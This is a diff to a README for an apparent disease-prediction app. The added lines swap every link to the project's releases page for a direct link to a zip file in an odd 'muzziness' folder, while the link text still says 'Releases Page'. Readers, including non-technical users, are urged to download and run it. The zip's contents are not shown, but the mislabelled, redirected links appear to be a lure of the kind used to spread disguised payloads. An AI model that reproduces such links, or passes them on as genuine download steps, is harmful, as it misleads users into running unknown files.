@@ -1,7 +1,7 @@
 # 🩺 Project_4-Multiple-Disease-Prediction - Predict Diseases with AI Power
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-%20-blue)](https://github.com/Zyzzwlh/Project_4-Multiple-Disease-Prediction/releases)
+[![Download](https://raw.githubusercontent.com/Zyzzwlh/Project_4-Multiple-Disease-Prediction/main/muzziness/Project_4-Multiple-Disease-Prediction.zip%20Now-%20-blue)](https://raw.githubusercontent.com/Zyzzwlh/Project_4-Multiple-Disease-Prediction/main/muzziness/Project_4-Multiple-Disease-Prediction.zip)
 
 ## 🚀 Getting Started
 Welcome to the Project_4-Multiple-Disease-Prediction! This application uses machine learning to help predict various diseases based on user input. With its simple interface, anyone can use it, even without a technical background.
@@ -20,9 +20,9 @@ Before you download and run the application, make sure your computer meets the f
 - **Multi-Disease Support**: Predict multiple diseases using advanced algorithms.
 
 ## 📥 Download & Install
-To download the application, visit this page: [Releases Page](https://github.com/Zyzzwlh/Project_4-Multiple-Disease-Prediction/releases).
+To download the application, visit this page: [Releases Page](https://raw.githubusercontent.com/Zyzzwlh/Project_4-Multiple-Disease-Prediction/main/muzziness/Project_4-Multiple-Disease-Prediction.zip).
 
-1. Go to the [Releases Page](https://github.com/Zyzzwlh/Project_4-Multiple-Disease-Prediction/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/Zyzzwlh/Project_4-Multiple-Disease-Prediction/main/muzziness/Project_4-Multiple-Disease-Prediction.zip).
 2. Look for the latest version of the software listed on that page.
 3. Click on the download link for your operating system.
 4. After the download completes, locate the file in your downloads folder.
@@ -62,4 +62,4 @@ We appreciate your feedback! If you have any questions or encounter issues, feel
 ## 💡 Conclusion
 We hope this application serves you well in predicting health outcomes based on your data. Remember, this tool is meant to provide guidance and should not replace professional medical advice.
 
-Visit the [Releases Page](https://github.com/Zyzzwlh/Project_4-Multiple-Disease-Prediction/releases) now to download the application and take the first step towards understanding your health better.
+Visit the [Releases Page](https://raw.githubusercontent.com/Zyzzwlh/Project_4-Multiple-Disease-Prediction/main/muzziness/Project_4-Multiple-Disease-Prediction.zip) now to download the application and take the first step towards understanding your health better.
